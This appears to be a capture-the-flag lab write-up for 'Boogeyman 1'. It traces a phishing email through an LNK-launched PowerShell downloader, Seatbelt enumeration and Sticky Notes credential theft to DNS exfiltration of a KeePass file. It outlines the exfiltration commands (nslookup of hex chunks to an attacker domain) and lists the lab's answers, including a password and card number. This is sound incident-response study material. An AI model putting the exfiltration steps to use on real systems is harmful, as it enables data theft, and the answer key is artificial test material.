Boogeyman 1: From Phishing Email to DNS Exfiltration

This version is written as an investigation story: what I saw in each artifact, what I suspected from it, which command or tool I used next, and how I connected endpoint evidence with PCAP evidence.

Investigation goal: reconstruct how Julianne Westcott was compromised, identify the phishing payload, follow the PowerShell activity, determine what data was accessed, and prove how the data left the network.

Scenario Overview

The case began with a business-looking email sent to a finance employee. The message claimed to be about a payment collection issue and included an encrypted archive. That is a common phishing trick: the archive password is included in the email so automated scanners have a harder time inspecting the payload.

Email → Encrypted ZIP → LNK file → Encoded PowerShell → Remote script → C2 → Enumeration → Sticky Notes → KeePass database → DNS exfiltration

How I Approached the Case

  1. Start with the email. Extract sender, victim, attachment, password and delivery clues.
  2. Analyze the payload safely. Do not double-click the attachment; inspect the LNK metadata and decode the command.
  3. Pivot to PowerShell logs. Endpoint logs explain what commands ran and what files were touched.
  4. Use the PCAP as confirmation. Network traffic proves C2, download server behavior and exfiltration protocol.
  5. Separate confirmed evidence from guesses. I only include indicators when they connect to the execution chain.

1. Email Triage: The Initial Access Clue

I opened the email artifact in a mail viewer first because I wanted the human-facing story: who sent it, who received it, what the lure said, and what file the victim was asked to open.

From: Arthur Griffin <agriffin@bpakcaging.xyz>
To: Julianne Westcott <julianne.westcott@hotmail.com>
Subject: Collection for Quick Logistics LLC - Jan 2023
Attachment: Invoice.zip

The first thing that stood out was the encrypted ZIP. A legitimate invoice can be zipped, but an email that gives the archive password in the body is suspicious because it can bypass some automated attachment scanning.

I then checked the headers. The DKIM/relay information pointed to Elastic Email infrastructure, which helped explain how the message was delivered.

Next step: extract the ZIP safely and inspect the payload type before running anything.

2. LNK Payload: Why the Attachment Was Not Just an Invoice

After extracting the archive, the payload was not a normal document. It was a Windows shortcut:

unzip Invoice.zip
file Invoice_20230103.lnk
lnkparse Invoice_20230103.lnk

A shortcut file is dangerous in this context because it can execute a command while looking like an invoice to the victim. I searched the parsed LNK output for command-line arguments and found an encoded PowerShell payload.

I decoded the command in CyberChef so I could read what it actually did.

The decoded logic showed a remote download-and-execute pattern. At this point, the case was no longer only a suspicious email; the LNK was an execution wrapper for PowerShell.

Important detail: I treated the decoded command as the starting point of endpoint impact. It told me what to search for next in PowerShell logs and network traffic.

3. PowerShell Logs: Following the Real Commands

The next artifact was the PowerShell log JSON. I used jq and text searching to make the logs easier to read:

cat powershell.json | jq '.'
cat powershell.json | jq -r '.. | strings?' | grep -iE "bpakcaging|Invoke|WebRequest|Download|nslookup|Seatbelt|sq3|kdbx"

The logs showed a script that used HTTP requests to communicate with a C2 endpoint. The two main attacker-controlled domains were:

files.bpakcaging.xyz  → payload/file hosting
cdn.bpakcaging.xyz:8080 → C2 endpoint

At this stage, I expected the PCAP to show matching HTTP traffic. But before switching to network traffic, I stayed in the PowerShell logs to understand what the attacker did after gaining execution.

4. Enumeration: Seatbelt Execution

I noticed sb.exe in the logs. The surrounding command context showed it was used for system enumeration, and the behavior matched Seatbelt.

grep -iE "sb.exe|seatbelt" powershell_strings.txt

This changed the investigation direction. The attacker was not only running a downloader; they were enumerating the compromised host after execution. That usually means they were looking for useful data, credentials, or configuration.

5. Sticky Notes: Finding Where the Password Came From

Later in the logs, I saw sq3.exe. The command around it referenced a Microsoft Sticky Notes database path:

C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

That path was a strong clue. plum.sqlite stores Sticky Notes data, and sq3.exe looked like a renamed SQLite command-line utility. I understood this step as credential discovery: the attacker was searching user notes for useful secrets.

The password recovered from the notes was later used to open the exfiltrated KeePass database:

%p9^3!lL^Mz47E2GaT^y

6. KeePass Targeting and File Preparation

The PowerShell logs showed the attacker targeting a KeePass database:

protected_data.kdbx

Then I saw commands that read the file as bytes, converted it into hexadecimal, split it into chunks and sent those chunks out through DNS queries. This explained why the exfiltration protocol was not HTTP even though the C2 used HTTP.

Get-Content protected_data.kdbx -Encoding Byte
Convert bytes to hex
Split hex into chunks
nslookup <hex_chunk>.<attacker_domain>

After reconstructing and opening the KeePass database with the recovered password, the credit card number inside was:

4024007128269551

7. PCAP Confirmation: HTTP C2 and DNS Exfiltration

At this point, the endpoint logs already told a strong story. I moved to the PCAP to prove the network side.

wireshark capture.pcapng
# Useful filters:
http
dns
ip.addr == 167.71.211.113
http.request.method == POST

The HTTP response header showed:

Server: SimpleHTTP/0.6 Python/3.10.7

That answered what software the attacker used to host the presumed file/payload server: Python SimpleHTTP server.

The C2 output used HTTP POST. That made sense because the infected host needed a way to send command output back to the attacker.

The DNS traffic showed long hex-like labels being queried. This matched the PowerShell evidence that converted the KeePass database to hex and sent it out using nslookup. Because the endpoint and PCAP agreed, I treated DNS as the confirmed exfiltration protocol.

How the Answers Were Derived

1. Payload hosting software

I followed HTTP traffic in Wireshark and checked the response headers. The server banner showed SimpleHTTP/0.6 Python/3.10.7, so the hosting software was Python SimpleHTTP server.

Wireshark filter:
http

Answer:
python

2. C2 output method

After seeing the PowerShell C2 logic, I checked HTTP requests in the PCAP. The infected host sent command output back with HTTP POST.

Wireshark filter:
http.request.method == POST

Answer:
POST

3. Exfiltration protocol

The PowerShell logs showed nslookup being used with encoded chunks. The PCAP confirmed matching DNS queries. That is why the exfiltration protocol was DNS.

Wireshark filter:
dns

Answer:
dns

4. KeePass password

The attacker queried Sticky Notes using sq3.exe. The recovered password was then used to open the stolen KeePass database.

Answer:
%p9^3!lL^Mz47E2GaT^y

5. Credit card number

After reconstructing the exfiltrated KeePass file and opening it with the recovered password, the stored credit card number was visible inside the database.

Answer:
4024007128269551

Final Answers

dns

What I Learned

  • Encrypted archives in phishing emails are suspicious when the password is included in the message body.
  • LNK files can hide encoded commands while pretending to be business documents.
  • PowerShell logs explain attacker intent and host activity, while PCAP confirms the network side.
  • DNS exfiltration often appears as long, strange subdomain labels that carry encoded chunks of data.
  • Good reporting should show why an answer is true, not only what the answer is.
